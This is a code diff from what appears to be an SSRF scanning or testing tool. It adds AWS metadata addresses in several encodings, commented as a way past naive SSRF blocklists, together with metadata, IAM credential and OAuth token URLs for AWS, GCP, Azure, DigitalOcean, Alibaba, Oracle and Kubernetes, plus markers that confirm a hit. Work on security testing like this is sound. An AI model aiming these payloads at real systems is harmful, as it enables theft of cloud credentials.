@@ -6,20 +6,40 @@ from core.verification_oracle import VerificationOracle, InteractshClient
 from tools.wrappers import curl
 
 
+# The link-local metadata address in forms a naive SSRF blocklist misses:
+# dotted, decimal, octal, hex and IPv6-mapped all resolve to 169.254.169.254.
+# Trying each is how an SSRF that is "blocked" on the obvious string still
+# reaches the metadata service.
+_AWS_HOSTS = (
+    "169.254.169.254",      # dotted
+    "2852039166",           # decimal
+    "0251.0376.0251.0376",  # octal
+    "0xA9.0xFE.0xA9.0xFE",  # hex
+    "[::ffff:169.254.169.254]",  # IPv6-mapped
+)
+
 CLOUD_METADATA_URLS = {
-    "aws": [
-        "http://169.254.169.254/latest/meta-data/",
-        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-        "http://169.254.169.254/latest/user-data/",
-    ],
+    "aws": [f"http://{h}/latest/meta-data/" for h in _AWS_HOSTS]
+           + [f"http://{h}/latest/meta-data/iam/security-credentials/"
+              for h in _AWS_HOSTS[:2]]
+           + ["http://169.254.169.254/latest/user-data/"],
     "gcp": [
         "http://metadata.google.internal/computeMetadata/v1/",
         "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
     ],
     "azure": [
         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     ],
+    "digitalocean": ["http://169.254.169.254/metadata/v1.json",
+                     "http://169.254.169.254/metadata/v1/"],
+    "alibaba": ["http://100.100.100.200/latest/meta-data/",
+                "http://100.100.100.200/latest/meta-data/ram/security-credentials/"],
+    "oracle": ["http://169.254.169.254/opc/v2/instance/",
+               "http://169.254.169.254/opc/v1/instance/"],
+    "kubernetes": ["https://kubernetes.default.svc/api",
+                   "http://169.254.169.254/latest/meta-data/"],
 }
 
 # A 200 alone is not metadata: any echo service answers 200. Each
@@ -28,6 +48,10 @@ CLOUD_METADATA_MARKERS = {
     "aws": ("ami-id", "instance-id", "security-credentials", "ami-launch-index"),
     "gcp": ("service-accounts", "project-id", "instance/", "zone"),
     "azure": ("azEnvironment", "compute", "network", "subscriptionId"),
+    "digitalocean": ("droplet_id", "region", "interfaces", "floating_ip"),
+    "alibaba": ("instance-id", "security-credentials", "region-id", "zone-id"),
+    "oracle": ("displayName", "compartmentId", "availabilityDomain", "ociAdName"),
+    "kubernetes": ("apiVersion", "serverAddressByClientCIDRs", "kind"),
 }
 
 
